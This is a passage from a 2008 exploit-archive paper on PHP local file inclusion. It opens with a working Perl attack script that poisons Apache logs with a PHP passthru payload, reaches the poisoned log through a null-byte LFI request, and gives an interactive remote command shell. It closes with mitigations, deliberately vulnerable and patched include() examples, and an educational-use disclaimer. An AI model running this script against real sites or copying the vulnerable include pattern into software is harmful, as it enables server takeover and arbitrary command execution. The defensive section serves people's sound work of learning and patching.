+	    print &quot;Ex. ./xpl.pl www.hackme.com /ktp/index.php?page=\n&quot;;
+	}
+
+	$host=$ARGV[0];
+	$path=$ARGV[1];
+
+	if ( $host   =~   /^http:/ ) {$host =~ s/http:\/\///g;}
+	
+	print &quot;\nTrying to Inject the Code...\n&quot;;
+	$CODE=&quot;&lt;?php if(get_magic_quotes_gpc()){ \$_GET[cmd]=stripslashes(\$_GET[cmd]);} passthru(\$_GET[cmd]);?&gt;&quot;;
+	$socket = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;, PeerAddr=&gt;&quot;$host&quot;, PeerPort=&gt;&quot;80&quot;) or die &quot;Could not connect to host.\n\n&quot;;
+	print $socket &quot;GET /cwhunderground &quot;.&quot;\#\#%\$\$%\#\#&quot;.$CODE.&quot;\#\#%\$\$%\#\#&quot;.&quot; HTTP/1.1\r\n&quot;;
+	print $socket &quot;Host: &quot;.$host.&quot;\r\n&quot;;
+	print $socket &quot;Connection: close\r\n\r\n&quot;;
+	close($socket);
+	
+	if ( $host   !~   /^http:/ ) {$host = &quot;http://&quot; . $host;}
+	
+	foreach $getlog(@apache)
+                {
+                  chomp($getlog);
+		  $find= $host.$path.$getlog.&quot;%00&quot;;
+                  $xpl = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
+		  $req = HTTP::Request-&gt;new(GET =&gt; $find);
+		  $res = $xpl-&gt;request($req);
+		  $info = $res-&gt;content;
+                  if($info =~ /cwhunderground/)
+                  {print &quot;\nSuccessfully injected in $getlog \n&quot;;$log=$getlog;}
+                }
+	
+	print &quot;cwh-shell# &quot;;
+	chomp( $cmd = &lt;STDIN&gt; );
+	
+	while($cmd !~ &quot;exit&quot;) {   
+			 $shell= $host.$path.$log.&quot;%00&amp;cmd=$cmd&quot;;
+			 $xpl = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
+			 $req = HTTP::Request-&gt;new(GET =&gt; $shell);
+			 $res = $xpl-&gt;request($req);
+			 $info = $res-&gt;content; 
+				 if ($info =~ /\#\#%\$\$%\#\#(.*?)\#\#%\$\$%\#\#/sg) 
+				 {print $1;}
+			 print &quot;cwh-shell# &quot;;
+			 chomp( $cmd = &lt;STDIN&gt; ); 
+	}
+	[End code]------------------------------------------------------------------------------
+
+
+########################################	
+ [0x05] - How to protect File Inclusion
+########################################
+ 
+- Consider implementing a chroot jail
+- Check user supplied files or filenames
+- Strongly validate user input, Ensure that all variables
+  are properly initialized prior to the first use 
+- Disable allow_url_fopen and allow_url_include 
+- Disable register_globals and use E_STRICT to find uninitialized variables 
+- Ensure that all file and stream functions (stream_*) are carefully vetted
+- To avoid being injected with remote files, it is essential to specify exactly 
+  where the file should be located, e.g. its full path
+- Secure Code, If you want to use include() function, For example:
+
+// Vulnerable Code !!
+
+
+[code]----------------------------------------------------------------------------------
+&lt;?php
+$file =$_GET['page']; 
+include($file);
+?&gt;
+[End code]------------------------------------------------------------------------------
+	
+
+// #1 Patching Code !!
+
+
+[code]----------------------------------------------------------------------------------
+&lt;?php
+include &quot;./new.php&quot;;		&lt;-- Should not use file name from $_GET content,
+?&gt;				    Always specify your files to include
+[End code]------------------------------------------------------------------------------
+
+
+// #2 Patching Code !!
+	
+
+[code]----------------------------------------------------------------------------------
+&lt;?php
+$file =$_GET['page']; 
+$check = array('index.php', 'new.php', 'guestbook.php');
+	if(in_array($file, $check))		&lt;-- Check $_GET['page'] from array[]
+		{include($file);}
+			else{die(&quot;Don't Hack Me Plz!&quot;);}
+?&gt;
+[End code]------------------------------------------------------------------------------
+
+
+#####################
+ [0x06] - References
+#####################
+
+[1] http://en.wikipedia.org/wiki/Remote_File_Inclusion
+[2] http://cwe.mitre.org/data/definitions/98.html
+[3] hakin9: Remote and File Inclusion Explained (Gordon Johnson)
+[4] http://www.perl.com/pub/a/2002/08/20/perlandlwp.html
+[5] www.owasp.org/index.php/PHP_Top_5
+[6] www.milw0rm.com
+
+####################
+ [0x07] - Greetz To
+####################
+	
+Greetz	    : ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos, Gdiupo, GnuKDE, JK
+Special Thx : asylu3, str0ke, citec.us, milw0rm.com
+
+				----------------------------------------------------
+	This paper is written for Educational purpose only. The authors are not responsible for any damage 
+ originating from using this paper in wrong objective. If you want to use this knowleadge with other person systems, 
+				you must request for consent from system owner before
+				----------------------------------------------------
+
+# milw0rm.com [2008-12-08]</pre>
+</html>
